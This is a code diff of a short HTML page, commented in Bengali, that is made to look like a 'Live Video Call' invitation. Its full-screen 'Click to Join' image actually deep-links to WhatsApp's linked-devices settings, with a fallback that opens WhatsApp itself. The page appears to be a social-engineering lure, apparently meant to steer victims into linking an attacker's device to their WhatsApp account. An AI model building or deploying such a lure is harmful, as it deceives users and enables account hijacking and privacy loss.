@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WhatsApp Direct Click</title>
+    <title>Live Video Call</title>
     <style>
         * {
             margin: 0;
@@ -15,29 +15,27 @@
             height: 100%;
             overflow: hidden;
             background-color: #000;
-            display: flex;
-            justify-content: center;
-            align-items: center;
         }
-        /* পুরো স্ক্রিন জুড়েই থাকবে ফটোটি */
-        .full-screen-img {
+        /* ছবিতে চাপ দেওয়ার সাথে সাথে হোয়াটসঅ্যাপে নিয়ে যাবে */
+        .click-image {
             width: 100vw;
             height: 100vh;
             object-fit: cover;
+            display: block;
             cursor: pointer;
         }
     </style>
 </head>
 <body>
 
-    <img src="https://picsum.photos/800/1200" alt="Click to open WhatsApp" class="full-screen-img" onclick="openWhatsApp()">
+    <!-- ছবিতে টিপ বা ক্লিক করলেই হোয়াটসঅ্যাপ অপশন চালু হবে -->
+    <img src="photo.jpg" alt="Click to Join" class="click-image" onclick="openWhatsApp()">
 
     <script>
         function openWhatsApp() {
-            // ১. সরাসরি WhatsApp-এর Linked Devices বা অ্যাপ ওপেন করার ইনটেন্ট
+            // হোয়াটসঅ্যাপ অ্যাপের ভেতরে রিডাইরেক্ট করার নির্দেশ
             window.location.href = "whatsapp://settings/linked_devices";
 
-            // ২. ব্যাকআপ ব্যাকগ্রাউন্ড রিডাইরেক্ট
             setTimeout(function() {
                 window.location.href = "whatsapp://";
             }, 800);
